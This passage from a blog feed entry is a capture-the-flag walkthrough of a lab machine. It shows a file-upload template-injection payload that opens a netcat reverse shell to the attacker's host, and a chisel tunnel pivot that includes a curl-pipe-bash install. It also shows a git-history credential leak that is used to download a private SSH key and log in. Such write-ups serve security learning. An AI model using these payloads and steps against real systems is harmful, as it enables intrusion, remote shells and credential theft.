+&lt;p&gt;Of course this will make our attack obvious to anyone using the site, so in a real world situation we&#x27;d hide this payload inside of the main page instead.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;POST &#x2F;upcloud HTTP&#x2F;1.1
+Host: 10.10.11.164
+Content-Length: 5853
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http:&#x2F;&#x2F;10.10.11.164
+Content-Type: multipart&#x2F;form-data; boundary=----WebKitFormBoundarySHIrKoubQdZqALfJ
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;102.0.5005.63 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q=0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q=0.8,application&#x2F;signed-exchange;v=b3;q=0.9
+Referer: http:&#x2F;&#x2F;10.10.11.164&#x2F;upcloud
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundarySHIrKoubQdZqALfJ
+Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;&#x2F;&#x2F;app&#x2F;app&#x2F;templates&#x2F;index.html&amp;quot;
+Content-Type: application&#x2F;octet-stream
+
+{{
+self.__init__.__globals__.__builtins__.__import__(&amp;#39;os&amp;#39;).system(&amp;#39;nc 10.10.14.7 4444 -e &#x2F;bin&#x2F;sh&amp;#39;)
+}}
+------WebKitFormBoundarySHIrKoubQdZqALfJ--
+
+
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Now on our attacking machine we want to prepare ourselves to recieve the reverse shell that we just planted.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# nc or ncat if your on osx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ncat -lvp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; 4444
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Send the exploit &lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; 10.10.11.164 80 &amp;lt; exploit.http
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Finally we can open the webpage in our browser to trigger the code and connect back to our listener. &lt;&#x2F;p&gt;
+&lt;p&gt;💥 we have a shell!&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Upgrade shell&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The shell we have is pretty crappy and we&#x27;ll want to upgrade it before we explore this box. &lt;&#x2F;p&gt;
+&lt;p&gt;First lets open a better shell binary &lt;code&gt;ash&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;python -c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;import pty; pty.spawn(&amp;quot;&#x2F;bin&#x2F;ash&amp;quot;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Next we&#x27;ll need to reset the &lt;code&gt;tty&lt;&#x2F;code&gt; which we can do by moving the current shell to the background reseting &lt;code&gt;stty&lt;&#x2F;code&gt; and rejoining the shell.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# hit CTRL-Z
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;stty&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; raw&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -echo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;fg
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;type &lt;code&gt;reset&lt;&#x2F;code&gt; and press &lt;code&gt;[enter]&lt;&#x2F;code&gt; and we should be met with a much more user friendly shell.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Explore box&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Now that we have a working shell we can jump all around the box checking out files and access.&lt;&#x2F;p&gt;
+&lt;p&gt;Both the user and root dir&#x27;s are empty and don&#x27;t contain flags! We must be in the wrong place... After some more investigating and remembering there&#x27;s a &lt;code&gt;Dockerfile&lt;&#x2F;code&gt;, we realize we&#x27;re in a container.&lt;&#x2F;p&gt;
+&lt;p&gt;Note:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;We have &lt;code&gt;root&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;We&#x27;re in a container&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;At this point we need some way to esclate but it looks unlikely that a Docker exploit will be the way in.&lt;&#x2F;p&gt;
+&lt;p&gt;Lets see if we can communicate with the filtered port we saw earlier. &lt;&#x2F;p&gt;
+&lt;p&gt;We can. Lets explore that further.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;pivot&quot;&gt;Pivot&lt;&#x2F;h2&gt;
+&lt;p&gt;Knowing that we can talk to the port. Lets see what services are running.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Prepare tunnel&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Let&#x27;s use chisel to tunnel our traffic from out attack box, through the target box.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;wget&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; https:&#x2F;&#x2F;github.com&#x2F;jpillora&#x2F;chisel&#x2F;releases&#x2F;download&#x2F;v1.7.7&#x2F;chisel_1.7.7_linux_386.gz
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ncat -lvp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; 8888 &amp;lt; chisel_1.7.7_linux_386.gz
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; 10.10.14.46 8888 &amp;gt; chisel.gz
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;On the target box lets unzip this binary and make it executable.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gzip -d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; chisel.gz
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;chmod&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; +x chisel
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Now on the attack box, lets listen for the connection&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; https:&#x2F;&#x2F;i.jpillora.com&#x2F;chisel! | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bash
+chisel&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; server&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; 7000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --reverse -v
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;Tunnel&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Connect &lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;chisel&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; client 10.10.14.46:7000 R:3000:10.10.11.164:3000
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Now we should be able to access port &lt;code&gt;localhost:3000&lt;&#x2F;code&gt; in our browser.&lt;&#x2F;p&gt;
+&lt;p&gt;Woop! That works and see can see Gitea running.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Explore hidden service&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Now that we have access to this git instance we&#x27;ll want to figure out how to get a shell on the box (not container).&lt;&#x2F;p&gt;
+&lt;p&gt;Snooping around the site we can see there&#x27;s an existing user named &lt;code&gt;dev01&lt;&#x2F;code&gt; and there&#x27;s not much else going on.&lt;&#x2F;p&gt;
+&lt;p&gt;At this point maybe we should revisit the &lt;code&gt;.git&lt;&#x2F;code&gt; folder and see if there are any artifacts that can help us.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Enumerate git commits&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;We can take a look at old commits via the git cli. &lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;git --no-pager&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; log&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --decorate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;=short&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -3 --stat
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -&amp;gt; dev)
+Author: gituser &amp;lt;gituser@local&amp;gt;
+Date:   Thu Apr 28 13:47:24 2022 +0200
+
+    ease testing
+
+ Dockerfile | 2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
+
+commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
+Author: gituser &amp;lt;gituser@local&amp;gt;
+Date:   Thu Apr 28 13:46:54 2022 +0200
+
+    added gitignore
+
+ .gitignore                | 26 ++++++++++++++++++++++++++
+ app&#x2F;.vscode&#x2F;settings.json |  5 -----
+ 2 files changed, 26 insertions(+), 5 deletions(-)
+
+commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
+Author: gituser &amp;lt;gituser@local&amp;gt;
+Date:   Thu Apr 28 13:46:16 2022 +0200
+
+    updated
+
+ app&#x2F;.vscode&#x2F;settings.json |  5 +++++
+ app&#x2F;app&#x2F;views.py          | 14 ++++++++++++--
+ 2 files changed, 17 insertions(+), 2 deletions(-)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Its interesting that the &lt;code&gt;app&#x2F;.vscode&#x2F;settings.json&lt;&#x2F;code&gt; has been added and deleted on the next commit.&lt;&#x2F;p&gt;
+&lt;p&gt;Lets look at the changes&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;git &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;\
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;    --no-pager&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; diff \
+    a76f8f75f7a4a12b706b0cf9c983796fa1985820 \
+    -- app&#x2F;.vscode&#x2F;settings.json
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;@@ -1,5 +0,0 @@
+-{
+-  &amp;quot;python.pythonPath&amp;quot;: &amp;quot;&#x2F;home&#x2F;dev01&#x2F;.virtualenvs&#x2F;flask-app-b5GscEs_&#x2F;bin&#x2F;python&amp;quot;,
+-  &amp;quot;http.proxy&amp;quot;: &amp;quot;http:&#x2F;&#x2F;dev01:Soulless_Developer#2022@10.10.10.128:5187&#x2F;&amp;quot;,
+-  &amp;quot;http.proxyStrictSSL&amp;quot;: false
+-}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;🙌 amazing! We can see that the dev accidently commited the &lt;code&gt;user:pass&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Explore git account&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;From this point we can use the UI to access the account by entering the creds we just found.&lt;&#x2F;p&gt;
+&lt;p&gt;After logging in, we can see that &lt;code&gt;dev01&lt;&#x2F;code&gt; has a private repo called &lt;code&gt;home-backup&lt;&#x2F;code&gt;. &lt;&#x2F;p&gt;
+&lt;p&gt;Inside of &lt;code&gt;home-backup&lt;&#x2F;code&gt; we have a &lt;code&gt;.ssh&#x2F;&lt;&#x2F;code&gt; folder which luckily (a super bad move by dev01) contains a private ssh key.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Clone ssh key&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;We can grab the key from the browser or download it as a file directly.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;\
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;    --user &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;dev01:Soulless_Developer#2022&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot; \
+    http:&#x2F;&#x2F;localhost:3000&#x2F;dev01&#x2F;home-backup&#x2F;raw&#x2F;branch&#x2F;main&#x2F;.ssh&#x2F;id_rsa &amp;gt; sshkey.pem
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Finally, we&#x27;ll try the key on the box&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# chmod 400 sshkey.pem
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ssh -i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; sshkey.pem dev01@10.10.11.164
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;💥 and were in!&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Show user flag&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Last step for the first flag is to &lt;code&gt;cat&lt;&#x2F;code&gt; the contents of the file.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cat&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; user.txt
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;🍾 WOOOOOOO, we did it. Our first CTF flag (at least the user flag)&lt;&#x2F;p&gt;
+&lt;p&gt;Next steps is to escalate our access to &lt;code&gt;root&lt;&#x2F;code&gt; but we&#x27;ll leave that for another day.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;summary&quot;&gt;Summary&lt;&#x2F;h1&gt;
+&lt;p&gt;Description: &lt;&#x2F;p&gt;
+&lt;p&gt;We used a &lt;strong&gt;relative path bug&lt;&#x2F;strong&gt; to leverage &lt;strong&gt;local file inclusion&lt;&#x2F;strong&gt; to &lt;strong&gt;open a reverse shell&lt;&#x2F;strong&gt; into the docker container. Then we &lt;strong&gt;pivoted&lt;&#x2F;strong&gt; from the container by &lt;strong&gt;tunneling traffic&lt;&#x2F;strong&gt; from the &lt;strong&gt;hidden service (git)&lt;&#x2F;strong&gt; to our local machine. Next we were able to esclate our access by &lt;strong&gt;enumerating old git commits&lt;&#x2F;strong&gt; to find hidden a hidden credential. Finally we were able to us the creds to access a &lt;strong&gt;ssh key&lt;&#x2F;strong&gt; which allowed us to access the box as a user.&lt;&#x2F;p&gt;
+&lt;p&gt;Steps:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Scan ports&lt;&#x2F;li&gt;
+&lt;li&gt;Explore source code structure&lt;&#x2F;li&gt;
+&lt;li&gt;Explore source code contents&lt;&#x2F;li&gt;
+&lt;li&gt;Examine validation logic&lt;&#x2F;li&gt;
+&lt;li&gt;Testing entrypoint&lt;&#x2F;li&gt;
+&lt;li&gt;Exploit relative path&lt;&#x2F;li&gt;
+&lt;li&gt;Reverse shell&lt;&#x2F;li&gt;
+&lt;li&gt;Upgrade shell&lt;&#x2F;li&gt;
+&lt;li&gt;Explore box&lt;&#x2F;li&gt;
+&lt;li&gt;Prepare tunnel&lt;&#x2F;li&gt;
+&lt;li&gt;Tunnel&lt;&#x2F;li&gt;
+&lt;li&gt;Explore hidden service&lt;&#x2F;li&gt;
+&lt;li&gt;Enumerate git commits&lt;&#x2F;li&gt;
+&lt;li&gt;Explore git account&lt;&#x2F;li&gt;
+&lt;li&gt;Clone ssh key&lt;&#x2F;li&gt;
+&lt;li&gt;Show user flag&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</content>
+	</entry>
+</feed>
